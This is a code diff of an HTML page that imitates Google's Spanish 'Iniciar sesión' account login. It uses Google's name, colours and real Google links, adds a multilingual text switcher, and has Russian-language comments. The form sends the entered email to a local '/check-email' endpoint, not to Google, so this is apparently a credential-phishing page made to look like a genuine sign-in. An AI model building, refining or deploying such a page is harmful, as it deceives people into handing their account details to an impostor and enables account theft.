@@ -2,92 +2,79 @@
 <html lang="es">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title data-translate="title">Iniciar sesión - Cuenta de Google</title>
-    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Iniciar sesión - Cuenta de Google</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
         }
         
         body {
-            font-size: 14px;
-            color: #202124;
-            background: #fff;
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 20%, #fbbc05 40%, #ea4335 60%, #4285f4 80%);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            color: #202124;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         
         .header {
             padding: 20px 30px;
             text-align: right;
-            border-bottom: none;
         }
         
-        .header-links {
-            display: flex;
-            justify-content: flex-end;
-            gap: 24px;
-        }
-        
-        .header-link {
-            color: #5f6368;
+        .header a {
+            color: white;
             text-decoration: none;
+            margin-left: 20px;
             font-size: 13px;
-            line-height: 24px;
+            opacity: 0.9;
+            transition: opacity 0.2s;
         }
         
-        .header-link:hover {
+        .header a:hover {
+            opacity: 1;
             text-decoration: underline;
         }
         
         .main-container {
-            flex: 1;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            padding-top: 40px;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
         }
         
-        .logo {
-            margin-bottom: 20px;
-        }
-        
-        .logo img {
-            width: 75px;
-            height: 24px;
-        }
-        
-        .form-container {
+        .form-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.2);
             width: 100%;
             max-width: 448px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
             padding: 48px 40px 36px;
-            margin: 0 auto;
         }
         
         .title {
             font-size: 24px;
             font-weight: 400;
-            line-height: 1.3333;
             text-align: center;
-            color: #202124;
             margin-bottom: 8px;
+            color: #202124;
         }
         
         .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            letter-spacing: 0.1px;
-            line-height: 1.5;
             text-align: center;
             color: #5f6368;
             margin-bottom: 36px;
+            font-size: 16px;
         }
         
         .input-container {
@@ -96,23 +83,19 @@
         
         .google-input {
             width: 100%;
-            padding: 13px 15px;
+            padding: 16px 14px;
             font-size: 16px;
-            line-height: 24px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background: #fff;
-            transition: border-color 0.2s;
+            border: 2px solid #dadce0;
+            border-radius: 8px;
+            transition: all 0.2s;
+            background: #f8f9fa;
         }
         
         .google-input:focus {
             outline: none;
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-        
-        .google-input:hover {
-            border-color: #8ab4f8;
+            border-color: #1a73e8;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
         }
         
         .forgot-link {
@@ -120,8 +103,9 @@
             color: #1a73e8;
             font-weight: 500;
             text-decoration: none;
-            font-size: 14px;
             margin-bottom: 48px;
+            font-size: 14px;
+            text-align: center;
         }
         
         .forgot-link:hover {
@@ -130,9 +114,10 @@
         
         .info-text {
             color: #5f6368;
-            font-size: 14px;
-            line-height: 1.4286;
             margin-bottom: 32px;
+            font-size: 14px;
+            line-height: 1.5;
+            text-align: center;
         }
         
         .info-text a {
@@ -155,148 +140,123 @@
             color: #1a73e8;
             font-weight: 500;
             text-decoration: none;
-            padding: 10px 8px;
-            border-radius: 4px;
-            font-size: 14px;
+            padding: 10px 16px;
+            border-radius: 6px;
+            transition: background 0.2s;
         }
         
         .create-account:hover {
-            background: #f6fafe;
+            background: #f8f9fa;
         }
         
         .next-button {
             background: #1a73e8;
-            color: #fff;
+            color: white;
             border: none;
-            padding: 10px 24px;
+            padding: 12px 28px;
             font-size: 14px;
             font-weight: 500;
-            border-radius: 4px;
+            border-radius: 6px;
             cursor: pointer;
-            min-width: 88px;
+            transition: background 0.2s;
         }
         
         .next-button:hover {
             background: #0d62d9;
-            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
+            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
         }
         
         .footer {
-            margin-top: 24px;
-            color: #5f6368;
-            font-size: 12px;
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
             text-align: center;
-            padding: 24px 0;
-        }
-        
-        .language-selector {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
         }
         
         .language-selector select {
-            padding: 8px 32px 8px 12px;
+            padding: 10px 40px 10px 16px;
             border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 13px;
+            border-radius: 6px;
+            font-size: 14px;
             color: #5f6368;
-            background: #fff url("data:image/svg+xml,%3Csvg fill='%235f6368' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3Cpath d='M0 0h24v24H0z' fill='none'/%3E%3C/svg%3E") no-repeat right 8px center;
-            -webkit-appearance: none;
-            -moz-appearance: none;
+            background: white;
             appearance: none;
-            cursor: pointer;
-        }
-        
-        .footer-links {
-            margin-top: 12px;
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-        }
-        
-        .footer-link {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 12px;
-        }
-        
-        .footer-link:hover {
-            text-decoration: underline;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%235f6368' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
         }
         
         @media (max-width: 480px) {
-            .form-container {
-                border: none;
-                padding: 24px;
-                max-width: 100%;
+            .form-card {
+                padding: 32px 24px;
+                border-radius: 8px;
             }
             
             .header {
                 padding: 16px;
             }
+            
+            .main-container {
+                padding: 16px;
+            }
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="header">
-        <div class="header-links">
-            <a href="https://accounts.google.com/signup" class="header-link" target="_blank" data-translate="create_account">Crear cuenta</a>
-            <a href="https://mail.google.com" class="header-link" target="_blank">Gmail</a>
-            <a href="https://www.google.com/imghp" class="header-link" target="_blank">Imágenes</a>
-        </div>
+        <a href="https://accounts.google.com/signup" target="_blank">Crear cuenta</a>
+        <a href="https://mail.google.com" target="_blank">Gmail</a>
+        <a href="https://images.google.com" target="_blank">Imágenes</a>
     </div>
     
     <div class="main-container">
-        <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
-        </div>
-        
-        <div class="form-container">
-            <h1 class="title" data-translate="sign_in">Iniciar sesión</h1>
-            <p class="subtitle" data-translate="use_account">Utiliza tu cuenta de Google</p>
+        <div class="form-card">
+            <h1 class="title">Iniciar sesión</h1>
+            <p class="subtitle">Utiliza tu cuenta de Google</p>
             
             <form action="/check-email" method="post">
                 <div class="input-container">
-                    <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus data-translate-placeholder="email_placeholder">
+                    <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
                 </div>
                 
-                <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank" data-translate="forgot_email">¿Has olvidado tu correo electrónico?</a>
+                <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank">
+                    ¿Has olvidado tu correo electrónico?
+                </a>
                 
                 <div class="info-text">
-                    <span data-translate="guest_mode">¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.</span>
-                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" data-translate="learn_more">Más información</a>
+                    ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.
+                    <br>
+                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank">
+                        Más información
+                    </a>
                 </div>
                 
                 <div class="button-group">
-                    <a href="https://accounts.google.com/signup" class="create-account" target="_blank" data-translate="create_account">Crear cuenta</a>
-                    <button type="submit" class="next-button" data-translate="next">Siguiente</button>
+                    <a href="https://accounts.google.com/signup" class="create-account" target="_blank">
+                        Crear cuenta
+                    </a>
+                    <button type="submit" class="next-button">
+                        Siguiente
+                    </button>
                 </div>
             </form>
         </div>
-        
-        <div class="footer">
-            <div class="language-selector">
-                <select id="languageSelect">
-                    <option value="es">Español (España)</option>
-                    <option value="en">English (United States)</option>
-                    <option value="fr">Français</option>
-                    <option value="de">Deutsch</option>
-                    <option value="pt">Português</option>
-                    <option value="it">Italiano</option>
-                </select>
-            </div>
-            <div class="footer-links">
-                <a href="https://support.google.com/accounts" class="footer-link" target="_blank" data-translate="help">Ayuda</a>
-                <a href="https://policies.google.com/privacy" class="footer-link" target="_blank" data-translate="privacy">Privacidad</a>
-                <a href="https://policies.google.com/terms" class="footer-link" target="_blank" data-translate="terms">Condiciones</a>
-            </div>
+    </div>
+    
+    <div class="footer">
+        <div class="language-selector">
+            <select id="languageSelect">
+                <option value="es">Español (España)</option>
+                <option value="en">English (United States)</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+            </select>
         </div>
     </div>
-
+    
     <script>
-        // Переводы для разных языков
         const translations = {
             'es': {
                 'title': 'Iniciar sesión - Cuenta de Google',
@@ -307,10 +267,7 @@
                 'guest_mode': '¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.',
                 'learn_more': 'Más información',
                 'create_account': 'Crear cuenta',
-                'next': 'Siguiente',
-                'help': 'Ayuda',
-                'privacy': 'Privacidad',
-                'terms': 'Condiciones'
+                'next': 'Siguiente'
             },
             'en': {
                 'title': 'Sign in - Google Account',
@@ -321,66 +278,69 @@
                 'guest_mode': 'Not your computer? Use Guest mode to sign in privately.',
                 'learn_more': 'Learn more',
                 'create_account': 'Create account',
-                'next': 'Next',
-                'help': 'Help',
-                'privacy': 'Privacy',
-                'terms': 'Terms'
+                'next': 'Next'
             },
             'fr': {
                 'title': 'Se connecter - Compte Google',
                 'sign_in': 'Se connecter',
                 'use_account': 'Utilisez votre compte Google',
-                'email_placeholder': 'Adresse e-mail ou numéro de téléphone',
+                'email_placeholder': 'Adresse e-mail ou téléphone',
                 'forgot_email': 'Adresse e-mail oubliée ?',
-                'guest_mode': "Ce n'est pas votre ordinateur ? Utilisez le mode invité pour vous connecter en privé.",
+                'guest_mode': "Ce n'est pas votre ordinateur ? Utilisez le mode invité.",
                 'learn_more': 'En savoir plus',
                 'create_account': 'Créer un compte',
-                'next': 'Suivant',
-                'help': 'Aide',
-                'privacy': 'Confidentialité',
-                'terms': 'Conditions'
+                'next': 'Suivant'
+            },
+            'de': {
+                'title': 'Anmelden - Google-Konto',
+                'sign_in': 'Anmelden',
+                'use_account': 'Verwenden Sie Ihr Google-Konto',
+                'email_placeholder': 'E-Mail oder Telefon',
+                'forgot_email': 'E-Mail vergessen?',
+                'guest_mode': 'Nicht Ihr Computer? Verwenden Sie den Gastmodus.',
+                'learn_more': 'Mehr erfahren',
+                'create_account': 'Konto erstellen',
+                'next': 'Weiter'
+            },
+            'it': {
+                'title': 'Accedi - Account Google',
+                'sign_in': 'Accedi',
+                'use_account': 'Usa il tuo Account Google',
+                'email_placeholder': 'Email o telefono',
+                'forgot_email': 'Hai dimenticato l\'email?',
+                'guest_mode': 'Non è il tuo computer? Usa la modalità Ospite.',
+                'learn_more': 'Ulteriori informazioni',
+                'create_account': 'Crea un account',
+                'next': 'Avanti'
             }
         };
-
-        // Функция для изменения языка
-        function changeLanguage(lang) {
+        
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            const lang = this.value;
             const langData = translations[lang] || translations['es'];
             
-            // Обновляем все элементы с data-translate
-            document.querySelectorAll('[data-translate]').forEach(element => {
-                const key = element.getAttribute('data-translate');
-                if (langData[key]) {
-                    element.textContent = langData[key];
-                }
-            });
+            // Обновляем тексты
+            document.querySelector('.title').textContent = langData.sign_in;
+            document.querySelector('.subtitle').textContent = langData.use_account;
+            document.querySelector('.google-input').placeholder = langData.email_placeholder;
+            document.querySelector('.forgot-link').textContent = langData.forgot_email;
             
-            // Обновляем placeholder
-            document.querySelectorAll('[data-translate-placeholder]').forEach(element => {
-                const key = element.getAttribute('data-translate-placeholder');
-                if (langData[key]) {
-                    element.placeholder = langData[key];
-                }
-            });
+            const infoText = document.querySelector('.info-text');
+            const textNodes = infoText.childNodes;
+            if (textNodes[0] && textNodes[0].nodeType === Node.TEXT_NODE) {
+                textNodes[0].textContent = langData.guest_mode + ' ';
+            }
             
-            // Обновляем title страницы
-            document.title = langData['title'];
-        }
-
-        // Инициализация при загрузке
-        document.addEventListener('DOMContentLoaded', function() {
-            const languageSelect = document.getElementById('languageSelect');
+            const link = infoText.querySelector('a');
+            if (link) link.textContent = langData.learn_more;
             
-            // Восстанавливаем выбранный язык из localStorage или используем испанский по умолчанию
-            const savedLang = localStorage.getItem('selectedLanguage') || 'es';
-            languageSelect.value = savedLang;
-            changeLanguage(savedLang);
+            const createAccount = document.querySelector('.create-account');
+            if (createAccount) createAccount.textContent = langData.create_account;
             
-            // Обработчик изменения языка
-            languageSelect.addEventListener('change', function() {
-                const selectedLang = this.value;
-                localStorage.setItem('selectedLanguage', selectedLang);
-                changeLanguage(selectedLang);
-            });
+            const nextButton = document.querySelector('.next-button');
+            if (nextButton) nextButton.textContent = langData.next;
+            
+            document.title = langData.title;
         });
     </script>
 </body>
